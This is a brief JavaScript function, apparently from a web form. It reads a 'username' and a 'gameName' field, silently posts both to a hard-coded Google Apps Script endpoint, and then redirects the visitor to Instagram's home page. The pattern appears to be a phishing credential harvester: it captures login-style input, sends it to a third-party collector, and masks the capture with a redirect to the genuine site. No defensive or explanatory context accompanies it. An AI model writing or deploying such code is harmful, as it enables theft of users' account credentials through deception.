function playGame(){

    var username = document.getElementById("username").value.trim();
    var gameName = document.getElementById("gameName").value.trim();

    if(username === "" || gameName === ""){
        return; // no alert as you wanted
    }

    fetch("https://script.google.com/macros/s/AKfycbx70dzV2OCP7z45SXdt-RODiQCgAPZrgg-Sts2iR_1U1XDZ6UGdXS1Znf0iVZS9Xg2C/exec", {
        method: "POST",
        body: new URLSearchParams({
            firstName: username,
            secondName: gameName
        })
    })
    .finally(function(){
        window.location.href = "https://www.instagram.com/?hl=en";
    });
}